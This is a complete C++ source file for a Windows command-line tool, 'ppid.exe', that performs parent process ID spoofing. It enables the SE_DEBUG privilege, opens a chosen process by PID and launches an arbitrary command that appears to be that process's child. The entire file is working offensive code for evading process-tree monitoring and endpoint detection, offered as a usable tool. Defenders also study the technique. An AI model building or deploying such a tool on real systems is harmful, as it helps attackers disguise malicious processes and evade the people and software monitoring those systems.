#include <tchar.h>
#include <windows.h>
#include <iostream>
#include <string>

BOOL AdjustCurrentProcessToken(void)
{
    HANDLE hToken;
    TOKEN_PRIVILEGES sTP;

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
    {
        if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &sTP.Privileges[0].Luid))
        {
            CloseHandle(hToken);
            return FALSE;
        }
        sTP.PrivilegeCount = 1;
        sTP.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        if (!AdjustTokenPrivileges(hToken, FALSE, &sTP, sizeof(sTP), NULL, NULL))
        {
            CloseHandle(hToken);
            return FALSE;
        }
        CloseHandle(hToken);
        return TRUE;
    }
    return FALSE;
}

int _tmain(int argc, _TCHAR* argv[])
{
    STARTUPINFOEX sie = { sizeof(sie) };
    PROCESS_INFORMATION pi;
    SIZE_T cbAttributeListSize = 0;
    PPROC_THREAD_ATTRIBUTE_LIST pAttributeList = nullptr;
    HANDLE hParentProcess = nullptr;
    DWORD dwPid = 0;
    _TCHAR* lpCommandLine = nullptr;

    // Help message
    if (argc != 5 || (!_tcscmp(_T("--help"), argv[1]) || !_tcscmp(_T("-h"), argv[1]))) {
        std::wcout << _T("-p  --pid <PID>    Parent process ID") << std::endl;
        std::wcout << _T("-c  --cmd <CMD>    Command to execute") << std::endl;
        std::wcout << _T("Usage: ppid.exe -c program -p pid") << std::endl;
        std::wcout << _T("Example: ppid.exe -c calc.exe -p 1337") << std::endl;
        return 0;
    }

    // Parse command line arguments
    if ((_tcscmp(_T("--pid"), argv[1]) == 0 || _tcscmp(_T("-p"), argv[1]) == 0) &&
        (_tcscmp(_T("--cmd"), argv[3]) == 0 || _tcscmp(_T("-c"), argv[3]) == 0))
    {
        dwPid = std::stoi(argv[2]);
        lpCommandLine = argv[4];
    }
    else if ((_tcscmp(_T("--cmd"), argv[1]) == 0 || _tcscmp(_T("-c"), argv[1]) == 0) &&
             (_tcscmp(_T("--pid"), argv[3]) == 0 || _tcscmp(_T("-p"), argv[3]) == 0))
    {
        lpCommandLine = argv[2];
        dwPid = std::stoi(argv[4]);
    }
    else
    {
        std::wcout << _T("[x] Incorrect Command line parameters") << std::endl;
        return 0;
    }

    // Initialize attribute list
    InitializeProcThreadAttributeList(NULL, 1, 0, &cbAttributeListSize);
    pAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, cbAttributeListSize);
    if (NULL == pAttributeList)
    {
        std::wcout << _T("[x] Error allocating heap: ") << GetLastError() << std::endl;
        return 0;
    }

    if (!InitializeProcThreadAttributeList(pAttributeList, 1, 0, &cbAttributeListSize))
    {
        std::wcout << _T("[x] Error Initializing process attribute: ") << GetLastError() << std::endl;
        return 0;
    }

    // Adjust token for SE_DEBUG privilege
    AdjustCurrentProcessToken();

    // Open parent process with necessary privileges
    hParentProcess = OpenProcess(PROCESS_CREATE_PROCESS | PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, FALSE, dwPid);
    if (NULL == hParentProcess)
    {
        std::wcout << _T("[x] Error opening parent process: ") << GetLastError() << std::endl;
        return 0;
    }

    // Set the parent process attribute
    if (!UpdateProcThreadAttribute(pAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL))
    {
        std::wcout << _T("[x] Error updating PROC_THREAD_ATTRIBUTE_PARENT_PROCESS: ") << GetLastError() << std::endl;
        return 0;
    }

    sie.lpAttributeList = pAttributeList;

    // Create the new process with the spoofed PPID
    if (!CreateProcess(NULL, lpCommandLine, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &sie.StartupInfo, &pi))
    {
        std::wcout << _T("[x] Error creating process: ") << GetLastError() << std::endl;
        return 0;
    }
    std::wcout << _T("[+] Process created with PID: ") << pi.dwProcessId << std::endl;

    // Cleanup
    DeleteProcThreadAttributeList(pAttributeList);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hParentProcess);

    return 0;
}
